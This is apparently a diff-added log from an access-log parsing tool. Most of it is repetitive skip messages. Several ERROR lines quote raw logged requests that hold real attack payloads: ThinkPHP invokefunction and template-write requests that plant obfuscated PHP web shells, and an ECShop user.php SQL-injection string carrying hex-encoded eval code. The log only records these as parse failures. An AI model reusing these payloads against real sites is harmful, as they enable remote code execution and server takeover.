+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210309] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210310] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210311] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210312] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210313] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210314] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210315] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210316] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210317] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210318] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210319] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210320] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210321] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210322] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210323] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210324] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210325] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210326] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210327] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210328] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210329] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210330] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210331] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210401] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210402] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210403] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210404] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210405] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210406] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210407] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210408] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210409] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210410] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210411] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210412] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210413] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210414] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210415] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210416] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210417] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210418] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210419] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210420] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210421] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210422] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210423] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210424] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210425] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210426] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210427] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210428] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210429] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210430] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210501] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210502] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210503] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210504] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210505] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210506] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210507] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210508] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210509] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210510] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210511] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210512] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210513] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210514] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210515] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210516] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210517] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210518] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210519] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210520] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210521] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210522] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210523] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210524] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210525] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210526] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210527] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210528] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210529] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210530] file parsing process
+2021-06-17 11:01:09 :: main :: accesslog_parsing :: INFO  :: already exist the parsed data. pass [20210531] file parsing process
+2021-06-17 11:03:47 :: main :: accesslog_parsing :: INFO  :: access log parsing start
+2021-06-17 11:09:39 :: main :: accesslog_parsing :: INFO  :: access log parsing start
+2021-06-17 11:11:24 :: main :: accesslog_parsing :: INFO  :: access log parsing start
+2021-06-17 11:12:22 :: main :: accesslog_parsing :: INFO  :: access log parsing start
+2021-06-17 11:13:37 :: main :: accesslog_parsing :: INFO  :: access log parsing start
+2021-06-17 13:36:19 :: main :: accesslog_parsing :: INFO  :: access log parsing start
+2021-06-17 13:39:16 :: main :: accesslog_parsing :: INFO  :: access log parsing start
+2021-06-17 15:12:14 :: main :: accesslog_parsing :: INFO  :: access log parsing start
+2021-06-17 15:18:26 :: main :: accesslog_parsing :: ERROR :: 'charmap' codec can't decode byte 0x8f in position 150: character maps to <undefined> :: 20210115 :: [71962, Windows-1253, b'59.8.63.215 - - [15/Jan/2021:14:25:33 +0900] 200 2 1058 "GET / HTTP/1.1" "http://www.jejuolletour.com/yangarius/sukso1/list_reserv1.asp?rsu=1&h_name=\xed\x8f\xac\xeb\x8f\x84\xed\x98\xb8\xed\x85\x94&ch_suksono=0&ad_suksono=2&ch_suksoday=2021-02-08&ch_suksopak=1" "Mozilla/5.0 (Windows NT 6.3; WOW64; Trident/7.0; rv:11.0) like Gecko" "-" "-"\n']
+2021-06-17 15:27:00 :: main :: accesslog_parsing :: INFO  :: access log parsing start
+2021-06-17 15:27:01 :: main :: accesslog_parsing :: ERROR :: 'NoneType' object has no attribute 'groupdict' :: 20210122 :: [21968, ascii, b'180.115.183.71 - - [22/Jan/2021:07:07:02 +0900] 200 1 1058 "GET /?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20="axsxsxexrxt";$poc_1%20=%20explode("x",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST[\'12345\']))));?> HTTP/1.1" "https://www.thepinx.co.kr//?s=index/think\\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20="axsxsxexrxt";$poc_1%20=%20explode("x",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST[\'12345\']))));?>" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "-" "-"\n']
+2021-06-17 15:27:01 :: main :: accesslog_parsing :: ERROR :: 'NoneType' object has no attribute 'groupdict' :: 20210122 :: [21970, ascii, b'180.115.183.71 - - [22/Jan/2021:07:07:03 +0900] 200 1 1058 "GET /?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20"xinba";$ch%20=%20explode(".","hello.ass.world.er.t");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" "https://www.thepinx.co.kr//?s=index/\\think\\template\\driver\\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20"xinba";$ch%20=%20explode(".","hello.ass.world.er.t");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?>" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "-" "-"\n']
+2021-06-17 15:27:01 :: main :: accesslog_parsing :: ERROR :: 'NoneType' object has no attribute 'groupdict' :: 20210122 :: [21974, ascii, b'180.115.183.71 - - [22/Jan/2021:07:07:03 +0900] 404 30 494 "GET /user.php?act=login HTTP/1.1" "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:288:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -";s:2:"id";s:3:"\'/*";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" "-" "-"\n']
+2021-06-17 15:30:40 :: main :: accesslog_parsing :: INFO  :: access log parsing start
+2021-06-17 15:30:41 :: main :: accesslog_parsing :: ERROR :: 'NoneType' object has no attribute 'groupdict' :: 20210122 :: [21968, ascii, 180.115.183.71 - - [22/Jan/2021:07:07:02 +0900] 200 1 1058 "GET /?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20="axsxsxexrxt";$poc_1%20=%20explode("x",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?> HTTP/1.1" "https://www.thepinx.co.kr//?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20="axsxsxexrxt";$poc_1%20=%20explode("x",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?>" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "-" "-"
+]
+2021-06-17 15:30:41 :: main :: accesslog_parsing :: ERROR :: 'NoneType' object has no attribute 'groupdict' :: 20210122 :: [21970, ascii, 180.115.183.71 - - [22/Jan/2021:07:07:03 +0900] 200 1 1058 "GET /?s=index/\think\template\driver\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20"xinba";$ch%20=%20explode(".","hello.ass.world.er.t");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" "https://www.thepinx.co.kr//?s=index/\think\template\driver\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20"xinba";$ch%20=%20explode(".","hello.ass.world.er.t");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?>" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "-" "-"
+]
+2021-06-17 15:30:41 :: main :: accesslog_parsing :: ERROR :: 'NoneType' object has no attribute 'groupdict' :: 20210122 :: [21974, ascii, 180.115.183.71 - - [22/Jan/2021:07:07:03 +0900] 404 30 494 "GET /user.php?act=login HTTP/1.1" "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:288:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -";s:2:"id";s:3:"'/*";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" "-" "-"
+]
+2021-06-17 16:10:48 :: main :: accesslog_parsing :: INFO  :: access log parsing start
+2021-06-17 16:58:31 :: main :: accesslog_parsing :: INFO  :: access log parsing start
+2021-06-17 16:58:32 :: main :: accesslog_parsing :: ERROR :: 'NoneType' object has no attribute 'groupdict' :: 20210122 :: [line_num : 21968 / encoding : ascii / text : 180.115.183.71 - - [22/Jan/2021:07:07:02 +0900] 200 1 1058 "GET /?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20="axsxsxexrxt";$poc_1%20=%20explode("x",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?> HTTP/1.1" "https://www.thepinx.co.kr//?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20="axsxsxexrxt";$poc_1%20=%20explode("x",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?>" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "-" "-"
+]
+2021-06-17 16:58:32 :: main :: accesslog_parsing :: ERROR :: 'NoneType' object has no attribute 'groupdict' :: 20210122 :: [line_num : 21970 / encoding : ascii / text : 180.115.183.71 - - [22/Jan/2021:07:07:03 +0900] 200 1 1058 "GET /?s=index/\think\template\driver\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20"xinba";$ch%20=%20explode(".","hello.ass.world.er.t");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" "https://www.thepinx.co.kr//?s=index/\think\template\driver\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20"xinba";$ch%20=%20explode(".","hello.ass.world.er.t");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?>" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "-" "-"
+]
+2021-06-17 16:58:32 :: main :: accesslog_parsing :: ERROR :: 'NoneType' object has no attribute 'groupdict' :: 20210122 :: [line_num : 21974 / encoding : ascii / text : 180.115.183.71 - - [22/Jan/2021:07:07:03 +0900] 404 30 494 "GET /user.php?act=login HTTP/1.1" "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:288:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -";s:2:"id";s:3:"'/*";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" "-" "-"
+]
+2021-06-17 17:07:44 :: main :: accesslog_parsing :: INFO  :: access log parsing start
+2021-06-17 17:07:45 :: main :: accesslog_parsing :: ERROR :: 'NoneType' object has no attribute 'groupdict' :: 20210122 :: [line_num : 21968 / encoding : ascii / text : 180.115.183.71 - - [22/Jan/2021:07:07:02 +0900] 200 1 1058 "GET /?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20="axsxsxexrxt";$poc_1%20=%20explode("x",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?> HTTP/1.1" "https://www.thepinx.co.kr//?s=index/think\app/invokefunction&function=call_user_func_array&vars[0]=file_put_contents&vars[1][]=12345.php&vars[1][1]=<?php%20$poc%20="axsxsxexrxt";$poc_1%20=%20explode("x",%20$poc);%20$poc_2%20=%20$poc_1[0]%20.%20$poc_1[1]%20.%20$poc_1[2]%20.%20$poc_1[3].%20$poc_1[4].%20$poc_1[5];$poc_2(urldecode(urldecode(urldecode($_REQUEST['12345']))));?>" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "-" "-"
+]
+2021-06-17 17:07:45 :: main :: accesslog_parsing :: ERROR :: 'NoneType' object has no attribute 'groupdict' :: 20210122 :: [line_num : 21970 / encoding : ascii / text : 180.115.183.71 - - [22/Jan/2021:07:07:03 +0900] 200 1 1058 "GET /?s=index/\think\template\driver\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20"xinba";$ch%20=%20explode(".","hello.ass.world.er.t");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?> HTTP/1.1" "https://www.thepinx.co.kr//?s=index/\think\template\driver\file/write&cacheFile=robots.php&content=xbshell1<?php$password%20=%20"xinba";$ch%20=%20explode(".","hello.ass.world.er.t");array_intersect_ukey(array($_REQUEST[$password]%20=>%201),%20array(1),%20$ch[1].$ch[3].$ch[4]);?>" "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)" "-" "-"
+]
+2021-06-17 17:07:45 :: main :: accesslog_parsing :: ERROR :: 'NoneType' object has no attribute 'groupdict' :: 20210122 :: [line_num : 21974 / encoding : ascii / text : 180.115.183.71 - - [22/Jan/2021:07:07:03 +0900] 404 30 494 "GET /user.php?act=login HTTP/1.1" "554fcae493e564ee0dc75bdf2ebf94caads|a:2:{s:3:"num";s:288:"*/ union select 1,0x272f2a,3,4,5,6,7,8,0x7b24617364275D3B617373657274286261736536345F6465636F646528275A6D6C735A56397764585266593239756447567564484D6F4A325A6B5A334575634768774A79776E50443977614841675A585A686243676B583142505531526262475678645630704F79412F506963702729293B2F2F7D787878,10-- -";s:2:"id";s:3:"'/*";}" "Mozilla/4.0 (compatible; MSIE 9.0; Windows NT 6.1)" "-" "-"
+]
+2021-06-17 17:07:58 :: main :: accesslog_parsing :: INFO  :: access log parsing start
